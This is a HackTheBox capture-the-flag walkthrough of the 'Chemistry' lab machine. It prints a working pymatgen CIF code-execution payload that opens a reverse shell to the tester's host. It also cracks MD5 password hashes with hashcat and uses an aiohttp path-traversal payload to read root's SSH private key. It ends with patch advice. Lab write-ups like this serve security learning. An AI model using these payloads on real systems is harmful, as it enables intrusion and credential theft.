---
title: "HackTheBox - Chemistry"
author: Nasrallah
description: ""
date: 2025-03-09 00:00:00 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, linux, easy, cve, rce, hashcat, crack]
img_path: /assets/img/hackthebox/machines/chemistry
image:
    path: chemistry.png
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---

[Chemistry](https://hacktheboxltd.sjv.io/Nasrallah?u=https://app.hackthebox.com/machines/chemistry) from [HackTheBox](https://hacktheboxltd.sjv.io/anqPJZ) contains a website that allows for uploading CIF files and process them, we exploit a vulnerability in the process code to execute code and get a shell. We find a db file in the machine with couple hashes, we crack them using hashcat to get the password of user app. We find a webserver listening locally on port 8080, the webserver is vulnerable to a path traversal allowing us to read the root's private ssh key and getting a root access.

## **Enumeration**

### nmap

We start an Nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.11.38                                                               
Host is up (0.43s latency).                                                                    
Not shown: 998 closed tcp ports (reset)                                                        
PORT     STATE SERVICE VERSION                                                                 
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)           
| ssh-hostkey:                                                                                 
|   3072 b6:fc:20:ae:9d:1d:45:1d:0b:ce:d9:d0:20:f2:6f:dc (RSA)                                 
|   256 f1:ae:1c:3e:1d:ea:55:44:6c:2f:f2:56:8d:62:3c:2b (ECDSA)           
|_  256 94:42:1b:78:f2:51:87:07:3e:97:26:c9:a2:5c:0a:26 (ED25519)                              
5000/tcp open  upnp?                                                                           
| fingerprint-strings:                                                                         
|   GetRequest:                                                                                
|     HTTP/1.1 200 OK                                                                          
|     Server: Werkzeug/3.0.3 Python/3.9.5  
```

We have ssh on port 22 and werkzeug python web server on port 5000.

### Web

Let's navigate to the website.

![werk](1.png)

We got a login page, we don't have any credentials so let's register a user and login.

![logedin](2.png)

We see an upload form for CIF files.

A quick search on google we find the vulnerability [CVE-2024-23346](https://nvd.nist.gov/vuln/detail/CVE-2024-23346) that allows for arbitrary code execution.

I found this [article](https://www.vicarius.io/vsociety/posts/critical-security-flaw-in-pymatgen-library-cve-2024-23346) that explains how the exploit works.

The poc we will be using can be found [here](https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f)

## **Foothold**

The poc creates a file, I'll change it to ping my machine and see if it works.

```text
data_5yOhtAoR
_audit_creation_date            2018-06-08
_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("ping -c 2 10.10.16.9");0,0,0'


_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```

![ping](3.png)

We uploaded the file and clicked on `view` to trigger it and it worked, now let's get a reverse shell.

```terminal
data_5yOhtAoR
_audit_creation_date            2018-06-08
_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("/bin/bash -c \'sh -i >& /dev/tcp/10.10.16.9/9001 0>&1\'");0,0,0'


_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```

We upload the file, setup our listener and view it.

```terminal
[★]$ nc -lvnp 9001     
listening on [any] 9001 ...
connect to [10.10.16.9] from (UNKNOWN) [10.10.11.38] 54332
sh: 0: can't access tty; job control turned off
$ id                  
uid=1001(app) gid=1001(app) groups=1001(app)
```

## **Privilege Escalation**

### app -> rosa

On `app`'s home directory we find a directory called `instance` with a db file in it.

```terminal
app@chemistry:~/instance$ ls
database.db
app@chemistry:~/instance$ file database.db 
database.db: SQLite 3.x database, last written using SQLite version 303100
```

We can use `sqlite3` to open it.

```terminal
pp@chemistry:~/instance$ sqlite3 database.db 
SQLite version 3.31.1 2020-01-27 19:55:54
Enter ".help" for usage hints.
sqlite> .tables;
Error: unknown command or invalid arguments:  "tables;". Enter ".help" for help
sqlite> .tables
structure  user     
sqlite> select * from user;
1|admin|2861debaf8d99436a10ed6f75a252abf
2|app|197865e46b878d9e74a0346b6d59886a
3|rosa|63ed86ee9f624c7b14f1d4f43dc251a5
4|robert|02fcf7cfc10adc37959fb21f06c6b467
```

We managed to find rosa`s password hash, it's md5 so let's crack it.

```terminal
hashcat ./rosa.hash /usr/share/wordlists/rockyou.txt -m 0
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

63ed86ee9f624c7b14f1d4f43dc251a5:unicorniosrosados        
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: 63ed86ee9f624c7b14f1d4f43dc251a5
Time.Started.....: Sat Nov 30 18:46:45 2024 (1 sec)
Time.Estimated...: Sat Nov 30 18:46:46 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  2892.0 kH/s (0.14ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 2983936/14344385 (20.80%)
Rejected.........: 0/2983936 (0.00%)
Restore.Point....: 2981888/14344385 (20.79%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: unicornn -> underwear88
Hardware.Mon.#1..: Util: 38%
```

We got the password.

### rosa -> root

Running linpeas we see another web server running on port 8080.

```terminal
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:5000            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -      
```

Let's forward that port using ssh.

```bash
ssh -L 8000:127.0.0.1:8080 rosa@10.10.11.38
```

Now we navigate to `127.0.0.1:8000`

![monitoring](4.png)

It's some time of monitoring system, the site looks static.

Checking the requests on burp we see the server being used.

![brup](5.png)

It's a python server with `aihttp/3.9.1`

We google that and find it's vulnerable to directory traversal [CVE-2024-23334](https://nvd.nist.gov/vuln/detail/cve-2024-23334)

The payload used on most POCs is `/static/../../../../etc/passwd`, I tried that but didn't work because we don't have static, what we have is `/assets/`

Using `/assets/../../../etc/passwd` gives us the file.

![passwd](6.png)

With that we can read the `/assets/../../../root/.ssh/id_rsa` file and connect as root.

```terminal
[★]$ ssh -i id_rsa root@10.10.11.38
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-196-generic x86_64

[...]

Last login: Fri Oct 11 14:06:59 2024
root@chemistry:~# id
uid=0(root) gid=0(root) groups=0(root)
```

## **Prevention and Mitigation**

### CVE-2024-23346

`Pymatgen` had a critical security flaw in `from_transformation_str`()` before version 2024.2.20, allowing code execution through unsafe eval().

Update to the latest patch and maintain an active patch schedule for any patches that may be released in the future.

### CVE-2024-23334

`aiohttp` is an asynchronous HTTP client/server framework for `asyncio` and Python. When using `aiohttp` as a web server and configuring static routes, it is necessary to specify the root path for static files. Additionally, the option 'follow_symlinks' can be used to determine whether to follow symbolic links outside the static root directory. When 'follow_symlinks' is set to True, there is no validation to check if reading a file is within the root directory. This can lead to directory traversal vulnerabilities, resulting in unauthorized access to arbitrary files on the system, even when symlinks are not present. Disabling follow_symlinks and using a reverse proxy are encouraged mitigations. Version 3.9.2 fixes this issue.

## **References**

<https://nvd.nist.gov/vuln/detail/CVE-2024-23346>

<https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f>

<https://www.vicarius.io/vsociety/posts/critical-security-flaw-in-pymatgen-library-cve-2024-23346>

<https://nvd.nist.gov/vuln/detail/cve-2024-23334>

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).
